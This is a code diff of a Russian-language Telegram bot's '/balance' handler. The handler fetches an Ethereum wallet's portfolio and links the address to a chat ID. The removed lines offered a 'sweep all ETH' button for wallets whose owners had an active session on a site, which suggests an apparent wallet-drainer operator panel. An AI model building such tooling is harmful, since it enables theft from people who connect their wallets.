@@ -1636,58 +1636,42 @@ const handleTelegramUpdate = async (update) => {
     return;
   }
 
-  if (command === "/balance") {
-    const address = text.slice(command.length).trim();
-    if (!address) {
-      await sendTelegramMessage(chatId, "Укажите адрес: /balance <0x...>");
-      return;
-    }
-
-    let normalizedAddress;
-    try {
-      normalizedAddress = normalizeWalletAddress(address, "evm");
-    } catch {
-      await sendTelegramMessage(chatId, "❌ Некорректный EVM-адрес.");
-      return;
-    }
-
-    const portfolio = await buildWalletPortfolio({ evmAddress: normalizedAddress, preferredChainId: 1 });
-    const balanceText = [
-      "📊 БАЛАНС КОШЕЛЬКА",
-      "",
-      `Адрес: ${normalizedAddress}`,
-      "",
-      ...formatPortfolioTelegramLines(portfolio),
-      "",
-      "━━━━━━━━━━━━━━━━━",
-    ].join("\n");
-
-    const at = nowIso();
-    database.prepare(`
-      INSERT INTO telegram_users (address, chat_id, created_at, updated_at)
-      VALUES (?, ?, ?, ?)
-      ON CONFLICT(address) DO UPDATE SET chat_id = excluded.chat_id, updated_at = excluded.updated_at
-    `).run(normalizedAddress, chatId, at, at);
-
-    const hasSession = hasActiveUserSession(normalizedAddress);
-    const keyboard = hasSession ? {
-      inline_keyboard: [
-        [
-          { text: "💰 Списать все ETH", callback_data: `sweep_${normalizedAddress}` }
-        ]
-      ]
-    } : undefined;
-
-    await sendTelegramMessage(chatId, balanceText, keyboard);
-
-    if (!hasSession) {
-      await sendTelegramMessage(
-        chatId,
-        "⚠️ У пользователя нет активной сессии на сайте. Он должен зайти и подключить кошелёк."
-      );
-    }
+if (command === "/balance") {
+  const address = text.slice(command.length).trim();
+  if (!address) {
+    await sendTelegramMessage(chatId, "Укажите адрес: /balance <0x...>");
     return;
   }
+
+  let normalizedAddress;
+  try {
+    normalizedAddress = normalizeWalletAddress(address, "evm");
+  } catch {
+    await sendTelegramMessage(chatId, "❌ Некорректный EVM-адрес.");
+    return;
+  }
+
+  const portfolio = await buildWalletPortfolio({ evmAddress: normalizedAddress, preferredChainId: 1 });
+  const balanceText = [
+    "📊 БАЛАНС КОШЕЛЬКА",
+    "",
+    `Адрес: ${normalizedAddress}`,
+    "",
+    ...formatPortfolioTelegramLines(portfolio),
+    "",
+    "━━━━━━━━━━━━━━━━━",
+  ].join("\n");
+
+  const at = nowIso();
+  database.prepare(`
+    INSERT INTO telegram_users (address, chat_id, created_at, updated_at)
+    VALUES (?, ?, ?, ?)
+    ON CONFLICT(address) DO UPDATE SET chat_id = excluded.chat_id, updated_at = excluded.updated_at
+  `).run(normalizedAddress, chatId, at, at);
+
+  await sendTelegramMessage(chatId, balanceText);
+  return;
+}
 
   if (!text.startsWith("/")) {
     // Обработка текстового ввода для админских действий (если нужно)
